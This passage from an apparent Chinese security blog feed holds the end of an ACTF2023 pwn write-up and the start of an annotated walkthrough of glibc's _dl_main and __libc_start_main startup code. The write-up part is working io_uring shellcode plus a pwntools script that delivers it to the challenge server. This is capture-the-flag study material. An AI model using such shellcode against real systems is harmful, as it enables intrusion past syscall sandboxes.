rdi,[rbp-0x380]</span><br><span class="hljs-string">call io_uring_get_sqe</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rsi,rax</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">lea rcx,[rbp-0x60]</span><br><span class="hljs-string">mov r8,0x50</span><br><span class="hljs-string">xor r9,r9</span><br><span class="hljs-string">mov rdi,23</span><br><span class="hljs-string">call io_uring_prep_rw</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov edi,dword ptr [rbp-0x380 + 196]</span><br><span class="hljs-string">mov esi,dword ptr [rbp-0x380+64]</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">xor rcx,rcx</span><br><span class="hljs-string">xor r8,r8</span><br><span class="hljs-string">mov r9,8</span><br><span class="hljs-string">mov rax,426</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">while:</span><br><span class="hljs-string">jmp while</span><br><span class="hljs-string"></span><br><span class="hljs-string">io_uring_prep_rw:</span><br><span class="hljs-string">xor rbx,rbx</span><br><span class="hljs-string">mov byte ptr [rsi],dil</span><br><span class="hljs-string">mov byte ptr [rsi+1],bl</span><br><span class="hljs-string">mov word ptr [rsi+2],bx</span><br><span class="hljs-string">mov dword ptr [rsi+4],edx</span><br><span class="hljs-string">mov [rsi+8],r9</span><br><span class="hljs-string">mov [rsi+16],rcx</span><br><span class="hljs-string">mov dword ptr [rsi+24],r8d</span><br><span class="hljs-string">mov dword ptr [rsi+28],ebx</span><br><span class="hljs-string">mov [rsi+32],rbx</span><br><span class="hljs-string">mov word ptr [rsi+40],bx</span><br><span class="hljs-string">mov word ptr [rsi+42],bx</span><br><span class="hljs-string">mov dword ptr [rsi+44],ebx</span><br><span class="hljs-string">mov qword ptr [rsi+56],rbx</span><br><span class="hljs-string">mov rbx,[rsi+56]</span><br><span class="hljs-string">mov [rsi+48],rbx</span><br><span class="hljs-string">ret</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">io_uring_get_sqe:</span><br><span class="hljs-string">mov     rax, [rdi]</span><br><span class="hljs-string">xor     r8d, r8d</span><br><span class="hljs-string">mov     ecx, [rax]</span><br><span class="hljs-string">mov     eax, [rdi+0x44]</span><br><span class="hljs-string">lea     edx, [rax+1]</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov     rcx, [rdi+0x10]</span><br><span class="hljs-string">mov     r10,[rcx]</span><br><span class="hljs-string">and     eax,dword ptr [rcx]</span><br><span class="hljs-string">mov     rcx,[rdi+48]</span><br><span class="hljs-string">mov     dword ptr [rcx+4*rax],eax</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov     [rdi+0x44], edx</span><br><span class="hljs-string">mov     [rdi+64],edx</span><br><span class="hljs-string">mov     rcx,[rdi+8]</span><br><span class="hljs-string">mov     dword ptr [rcx],edx</span><br><span class="hljs-string"></span><br><span class="hljs-string">shl     rax, 6</span><br><span class="hljs-string">add     rax, [rdi+0x38]</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(shellcode)))<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;120.46.65.156&quot;</span>,<span class="hljs-string">&quot;32101&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;code&#x27;</span>,asm(shellcode))<br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/ACTF2023/master-of-orw-1.png" srcset="/img/loading.gif" lazyload alt="执行效果" title="执行效果"></p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>程序启动过程分析(二)--_dl_main&amp;空间管理</title>
    <link href="/page/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90(%E4%BA%8C)/"/>
    <url>/page/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<h2 id="大致流程图">大致流程图</h2><p><img src="/img/blog_img/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B.png" srcset="/img/loading.gif" lazyload alt="程序启动流程" title="程序启动流程"></p><h2 id="分析代码">分析代码</h2><h3 id="dl-main">_dl_main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">以下代码已经删去了部分无关代码</span><br><span class="hljs-comment">请以实际源代码为准</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">dl_main</span> <span class="hljs-params">(<span class="hljs-type">const</span> ElfW(Phdr) *phdr,</span><br><span class="hljs-params"> ElfW(Word) phnum,</span><br><span class="hljs-params"> ElfW(Addr) *user_entry,</span><br><span class="hljs-params"> ElfW(<span class="hljs-type">auxv_t</span>) *auxv)</span><br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">main_map</span>;</span><br>  <span class="hljs-type">size_t</span> file_size;<br>  <span class="hljs-type">char</span> *file;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">bool</span> rtld_is_main = <span class="hljs-literal">false</span>;<br>  <span class="hljs-type">void</span> *tcbp = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dl_main_state</span> <span class="hljs-title">state</span>;</span><br>  dl_main_state_init (&amp;state);<br><br>  process_envvars (&amp;state); <br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> HAVE_INLINED_SYSCALLS</span><br>  _dl_starting_up = <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ld_so_name = _dl_argv[<span class="hljs-number">0</span>];<br>  <span class="hljs-keyword">if</span> (*user_entry == (ElfW(Addr)) ENTRY_POINT)<br>    &#123;<br>    ...<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    将ld.so作为执行程序,并解析命令行传入的参数</span><br><span class="hljs-comment">    */</span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      main_map = _dl_new_object ((<span class="hljs-type">char</span> *) <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, lt_executable, <span class="hljs-literal">NULL</span>,<br> __RTLD_OPENEXEC, LM_ID_BASE);<br>      assert (main_map != <span class="hljs-literal">NULL</span>);<br>      main_map-&gt;l_phdr = phdr;<br>      main_map-&gt;l_phnum = phnum;<br>      main_map-&gt;l_entry = *user_entry;<br><br>      _dl_add_to_namespace_list (main_map, LM_ID_BASE);<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">      构造程序相关的link_map结构体</span><br><span class="hljs-comment">      */</span><br>      assert (main_map == GL(dl_ns)[LM_ID_BASE]._ns_loaded);<br><br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (! rtld_is_main)<br>    &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    设置段中的指针偏移为真实地址</span><br><span class="hljs-comment">    */</span><br>       elf_get_dynamic_info (main_map, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br><br>      <span class="hljs-keyword">if</span> (main_map-&gt;l_info[DT_SONAME] != <span class="hljs-literal">NULL</span><br>  &amp;&amp; (<span class="hljs-built_in">strcmp</span> (((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) D_PTR (main_map, l_info[DT_STRTAB])<br>      + main_map-&gt;l_info[DT_SONAME]-&gt;d_un.d_val), LIBC_SO)<br>      == <span class="hljs-number">0</span>))<br>GL(dl_ns)[LM_ID_BASE].libc_map = main_map;<br><br>      _dl_setup_hash (main_map);<br>    &#125;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> **<span class="hljs-title">first_preload</span> =</span> &amp;GL(dl_rtld_map).l_next;<br><br>  setup_vdso (main_map, &amp;first_preload); <br><br>  setup_vdso_pointers (); <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  映射vdso空间</span><br><span class="hljs-comment">  并从vdso空间中搜索符号</span><br><span class="hljs-comment">  */</span><br><br>  call_init_paths (&amp;state);<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  设置依赖库所在目录</span><br><span class="hljs-comment">  在之后加载依赖库时会从这些目录中搜索</span><br><span class="hljs-comment">  */</span><br><br><br>  assert (*first_preload == <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> **<span class="hljs-title">preloads</span> =</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> npreloads = <span class="hljs-number">0</span>;<br><br>  ...  <span class="hljs-comment">/* </span><br><span class="hljs-comment">  从系统变量LD_PRELOAD,参数--preload,系统文件/etc/ld.so.preload</span><br><span class="hljs-comment">  中提取需要提前加载的依赖库名称与路径,并加载依赖库</span><br><span class="hljs-comment">  */</span><br>  <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> NEED_DL_SYSINFO_DSO</span><br>  <span class="hljs-keyword">if</span> (GLRO(dl_sysinfo_map) != <span class="hljs-literal">NULL</span>)<br>    _dl_audit_objopen (GLRO(dl_sysinfo_map), LM_ID_BASE);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  &#123;<br>    _dl_map_object_deps (main_map, preloads, npreloads,<br> state.mode == rtld_mode_trace, <span class="hljs-number">0</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> 根据elf文件的dynamic段中DT_NEEDED字段的信息获取依赖库路径/名称</span><br><span class="hljs-comment"> 加载所需依赖 </span><br><span class="hljs-comment"> */</span><br>  &#125;<br><br>  <span class="hljs-keyword">for</span> (i = main_map-&gt;l_searchlist.r_nlist; i &gt; <span class="hljs-number">0</span>; )<br>    main_map-&gt;l_searchlist.r_list[--i]-&gt;l_global = <span class="hljs-number">1</span>;<br><br>... <span class="hljs-comment">/*</span><br><span class="hljs-comment">将 _dl_rtld_map 移动到相关列表的最后</span><br><span class="hljs-comment">*/</span><br><br>  <span class="hljs-type">bool</span> was_tls_init_tp_called = tls_init_tp_called;<br>  <span class="hljs-keyword">if</span> (tcbp == <span class="hljs-literal">NULL</span>)<br>    tcbp = init_tls (<span class="hljs-number">0</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">构造当前线程的tls空间</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-keyword">if</span> (__glibc_likely (need_security_init))<br>    security_init (); <br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        构造stack_chk_guard与pointer_chk_guard_local</span><br><span class="hljs-comment">        用于栈溢出保护与指针保护</span><br><span class="hljs-comment">        */</span><br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (state.mode != rtld_mode_normal))<br>    &#123;<br>    ... <span class="hljs-comment">/*</span><br><span class="hljs-comment">    ld.so 主要执行的代码</span><br><span class="hljs-comment">    这一段不是给程序用的</span><br><span class="hljs-comment">    */</span><br>    &#125;<br><br>  GL(dl_ns)[LM_ID_BASE]._ns_main_searchlist = &amp;main_map-&gt;l_searchlist;<br><br>  GLRO(dl_initial_searchlist) = *GL(dl_ns)[LM_ID_BASE]._ns_main_searchlist;<br><br>  GLRO(dl_init_all_dirs) = GL(dl_all_dirs);<br><br>  <span class="hljs-comment">/* Print scope information.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_SCOPES))<br>    &#123;<br>      _dl_debug_printf (<span class="hljs-string">&quot;\nInitial object scopes\n&quot;</span>);<br><br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">struct</span> link_map *l = main_map; l != <span class="hljs-literal">NULL</span>; l = l-&gt;l_next)<br>_dl_show_scope (l, <span class="hljs-number">0</span>);<br>    &#125;<br><br>  _rtld_main_check (main_map, _dl_argv[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-type">int</span> consider_profiling = GLRO(dl_profile) != <span class="hljs-literal">NULL</span>;<br><br>  GLRO(dl_lazy) |= consider_profiling;<br><br>  &#123;<br>    <span class="hljs-type">unsigned</span> i = main_map-&gt;l_searchlist.r_nlist;<br>    <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>      &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span> =</span> main_map-&gt;l_initfini[i];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">libname_list</span> *<span class="hljs-title">lnp</span> =</span> l-&gt;l_libname-&gt;next;<br><br><span class="hljs-keyword">while</span> (__builtin_expect (lnp != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>  &#123;<br>    lnp-&gt;dont_free = <span class="hljs-number">1</span>;<br>    lnp = lnp-&gt;next;<br>  &#125;<br>l-&gt;l_free_initfini = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (l != &amp;GL(dl_rtld_map))<br>  _dl_relocate_object (l, l-&gt;l_scope, _dl_lazy ? RTLD_LAZY : <span class="hljs-number">0</span>,<br>       consider_profiling);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">配置程序got表</span><br><span class="hljs-comment">根据程序的DT_FLAGS&amp;8或DT_FLAGS_1&amp;1判断是否开启延迟绑定</span><br><span class="hljs-comment">对于rel表或rela表项对应的got表项是必定设置为真实地址的</span><br><span class="hljs-comment">当开启了延迟绑定时,</span><br><span class="hljs-comment">搜索符号设置jmprel表项对应的got表项为真实地址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span> (l-&gt;l_tls_blocksize != <span class="hljs-number">0</span> &amp;&amp; tls_init_tp_called)<br>  _dl_add_to_slotinfo (l, <span class="hljs-literal">true</span>);<br>      &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GL(dl_profile_map) != <span class="hljs-literal">NULL</span>))<br>    _dl_start_profile ();<br><br>  <span class="hljs-keyword">if</span> ((!was_tls_init_tp_called &amp;&amp; GL(dl_tls_max_dtv_idx) &gt; <span class="hljs-number">0</span>)<br>      || count_modids != _dl_count_modids ())<br>    ++GL(dl_tls_generation);<br><br>  _dl_allocate_tls_init (tcbp, <span class="hljs-literal">false</span>);<br><br>  <span class="hljs-keyword">if</span> (! tls_init_tp_called)<br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *lossage = TLS_INIT_TP (tcbp);<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (lossage != <span class="hljs-literal">NULL</span>))<br>_dl_fatal_printf (<span class="hljs-string">&quot;cannot set up thread-local storage: %s\n&quot;</span>,<br>  lossage);<br>      __tls_init_tp ();<br>    &#125;<br><br>  assert (GLRO(dl_init_all_dirs) == GL(dl_all_dirs));<br><br>  <span class="hljs-keyword">if</span> (rtld_multiple_ref)<br>    &#123;<br>      _dl_find_object_init ();<br><br>      __rtld_malloc_init_real (main_map);<br><br>      __rtld_mutex_init ();<br><br>      GL(dl_rtld_map).l_relocated = <span class="hljs-number">0</span>;<br>      _dl_relocate_object (&amp;GL(dl_rtld_map), main_map-&gt;l_scope, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>  _dl_call_libc_early_init (GL(dl_ns)[LM_ID_BASE].libc_map, <span class="hljs-literal">true</span>);<br><br>  _dl_sysdep_start_cleanup (); <br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  _dl_audit_activity_nsid (LM_ID_BASE, LA_ACT_CONSISTENT);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  r = _dl_debug_update (LM_ID_BASE);<br>  r-&gt;r_state = RT_CONSISTENT;<br>  _dl_debug_state ();<br>  LIBC_PROBE (init_complete, <span class="hljs-number">2</span>, LM_ID_BASE, r);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined USE_LDCONFIG &amp;&amp; !defined MAP_COPY</span><br>  _dl_unload_cache ();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="dl-main概要">_dl_main概要</h4><p>分析代码可以得到<code>_dl_main</code>中调用的几个比较重要的函数</p><ul><li><code>process_envvars</code>: 解析全局变量中<code>LD_</code>开头的变量</li><li><code>setup_vdso</code>: 将内核空间中的<code>vdso</code>空间映射到用户空间中</li><li><code>_dl_map_object_deps</code>: 加载程序所需的所有依赖</li><li><code>init_tls</code>: 初始化当前线程的<code>tls</code>空间</li><li><code>_dl_relocate_object</code>: 搜索符号设置got表内容, 并设置各个段的访问权限</li></ul><p>至此, 程序已经加载完毕, 随时都可以开始运行程序代码</p><p>不过既然这些程序加载的操作都做好了，还要<code>__libc_start_main</code>做什么，这还需要继续阅读源码才能知道</p><h3 id="libc-start-main">__libc_start_main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs c">STATIC <span class="hljs-type">int</span><br>__libc_start_main_impl (<span class="hljs-type">int</span> (*main) (<span class="hljs-type">int</span>, <span class="hljs-type">char</span> **, <span class="hljs-type">char</span> ** MAIN_AUXVEC_DECL),<br> <span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> LIBC_START_MAIN_AUXVEC_ARG</span><br> Elf64_auxv_t *auxvec,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <span class="hljs-comment">//__typeof (main) init,</span><br><span class="hljs-type">int</span> (*init) (<span class="hljs-type">int</span>, <span class="hljs-type">char</span> **, <span class="hljs-type">char</span> ** MAIN_AUXVEC_DECL),<br> <span class="hljs-type">void</span> (*fini) (<span class="hljs-type">void</span>),<br> <span class="hljs-type">void</span> (*rtld_fini) (<span class="hljs-type">void</span>), <br> <span class="hljs-type">void</span> *stack_end)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SHARED</span><br>  <span class="hljs-type">char</span> **ev = &amp;argv[argc + <span class="hljs-number">1</span>];<span class="hljs-comment">//获取环境变量字符串指针数组开头</span><br><br>  __environ = ev;<br><br>  <span class="hljs-comment">/* Store the lowest stack address.  This is done in ld.so if this is</span><br><span class="hljs-comment">     the code for the DSO.  */</span><br>  __libc_stack_end = stack_end;<br><br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> HAVE_AUX_VECTOR</span><br>  <span class="hljs-comment">/* First process the auxiliary vector since we need to find the</span><br><span class="hljs-comment">     program header to locate an eventually present PT_TLS entry.  */</span><br><span class="hljs-meta">#  <span class="hljs-keyword">ifndef</span> LIBC_START_MAIN_AUXVEC_ARG</span><br>  Elf64_auxv_t  *auxvec;<br>  &#123;<br>    <span class="hljs-type">char</span> **evp = ev;<br>    <span class="hljs-keyword">while</span> (*evp++ != <span class="hljs-literal">NULL</span>)<br>      ;<br>    auxvec = (Elf64_auxv_t *) evp;<br>  &#125;<br><span class="hljs-meta">#  <span class="hljs-keyword">endif</span></span><br>  _dl_aux_init (auxvec);<br>  <span class="hljs-keyword">if</span> (_dl_phdr == <span class="hljs-literal">NULL</span>)<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>    &#123;<br>      <span class="hljs-comment">/* Starting from binutils-2.23, the linker will define the</span><br><span class="hljs-comment">         magic symbol __ehdr_start to point to our own ELF header</span><br><span class="hljs-comment">         if it is visible in a segment that also includes the phdrs.</span><br><span class="hljs-comment">         So we can set up _dl_phdr and _dl_phnum even without any</span><br><span class="hljs-comment">         information from auxv.  */</span><br><br>      <span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Ehdr)</span> __ehdr_start<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> BUILD_PIE_DEFAULT</span><br>__<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((visibility (<span class="hljs-string">&quot;hidden&quot;</span>)))</span>;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>__attribute__ ((weak, visibility (<span class="hljs-string">&quot;hidden&quot;</span>)));<br>      <span class="hljs-keyword">if</span> (&amp;__ehdr_start != <span class="hljs-literal">NULL</span>)<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>        &#123;<br>          assert (__ehdr_start.e_phentsize == <span class="hljs-keyword">sizeof</span> *GL(dl_phdr));<br>          GL(dl_phdr) = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) &amp;__ehdr_start + __ehdr_start.e_phoff;<br>          GL(dl_phnum) = __ehdr_start.e_phnum;<br>        &#125;<br>    &#125;<br><br>  __tunables_init 